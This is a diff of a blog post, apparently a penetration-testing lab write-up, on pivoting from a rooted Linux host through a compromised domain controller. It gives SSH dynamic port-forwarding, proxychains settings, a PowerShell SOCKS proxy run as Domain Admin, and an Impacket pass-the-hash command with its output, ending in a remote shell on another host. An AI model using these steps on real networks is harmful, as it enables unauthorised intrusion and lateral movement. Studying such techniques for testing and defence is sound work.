@@ -1,29 +1,96 @@
 ---
 layout: post
-title:  "TODO Title"
-date:   2019-10-18 00:32:19 +0100
+title:  "Pivoting In A Linux + Windows Env"
+date:   2019-10-18 10:03:00 +0100
 categories: jekyll update
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
 
-Jekyll requires blog post files to be named according to the following format:
+Scenario: I had rooted a linux box and used it to compromise other machines including a DC. And now I wanted to use that DC to go deeper into the network.
 
-`YEAR-MONTH-DAY-title.MARKUP`
+What I wanted to achieve:
 
-Where `YEAR` is a four-digit number, `MONTH` and `DAY` are both two-digit numbers, and `MARKUP` is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.
+```
++--------+     +-----+    +--+
+|attacker+---->+Linux+--->+DC|
++--------+     +-----+    +--+
+                          |
+                          |
+                          v
+                        +--------------+
+                        |Access to more|
+                        |Things in the |
+                        |Network       |
+                        +--------------+
+```
 
-Jekyll also offers powerful support for code snippets:
+I was already pivoting on the Linux box, now I wanted to do the same on the DC.
 
-{% highlight ruby %}
-def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=> prints 'Hi, Tom' to STDOUT.
+## Pivoting on The Linux Box
+
+### On Our Attacking Machine
+I already had the private key for the root account, so I connected and setup dynamic port forwarding (setting up a socks proxy basically) over port 9000:
+
+`ssh -i ~/.ssh/keys/key1 -D 9000 -Nf root@10.10.110.126`
+
+modify /etc/proxychains.conf to include the linux box:
+
+{% highlight bash %}
+[ProxyList]
+### For Lab:
+socks4 127.0.0.1 9000 
 {% endhighlight %}
 
-Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
+And thats it, now prefix any command you need to be proxied through the linux box with `proxychains`.
 
-[jekyll-docs]: https://jekyllrb.com/docs/home
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-talk]: https://talk.jekyllrb.com/
+## Pivoting on The Windows Machine
+I used the following powershell script to setup a socks proxy on the windows machine (DC): https://github.com/p3nt4/Invoke-SocksProxy
+
+### On The DC:
+
+Drop the script `Invoke-SocksProxy.psm1` from the repo on the windows machine. And run it.
+In this scenario I ran the socks proxy on port 9000, note that I am a Domain Admin:
+
+{% highlight bash %}
+PS C:\users\humoud\Documents> Import-Module .\Invoke-SocksProxy.psm1
+PS C:\users\humoud\Documents> Invoke-SocksProxy -bindPort 9000
+Listening on port 9000...
+New Connection from  172.16.1.221:36328
+Threads Left: 199
+New Connection from  172.16.1.221:36330
+Threads Left: 199
+New Connection from  172.16.1.221:36332
+Threads Left: 198
+New Connection from  172.16.1.221:36334
+Threads Left: 197
+{% highlight bash %}
+
+### On Our Attacking Machine (Kali):
+Now, we need to configure proxychains on our attacking machine.
+
+modify /etc/proxychains.conf:
+
+{% highlight bash %}
+[ProxyList]
+### For Lab:
+socks4 127.0.0.1 9000   # For the Linux Box, already there
+socks4 172.16.1.2 9000  # Windows Box (DC1) <added this>
+{% endhighlight %}
+
+### Testing:
+Time to test the setup, run a command prefixed with `proxychains`.
+Here I ran wmiexec from Impacket, attempted to pass-the-hash and it succeeded:
+
+{% highlight bash %}
+# proxychains wmiexec.py -hashes :some_hash_here_:) administrator@172.16.2.3
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:9000-<>-172.16.1.2:9000-<><>-172.16.2.3:445-<><>-OK
+[*] SMBv3.0 dialect used
+|S-chain|-<>-127.0.0.1:9000-<>-172.16.1.2:9000-<><>-172.16.2.3:135-<><>-OK
+|S-chain|-<>-127.0.0.1:9000-<>-172.16.1.2:9000-<><>-172.16.2.3:49666-<><>-OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+{% endhighlight %}
+
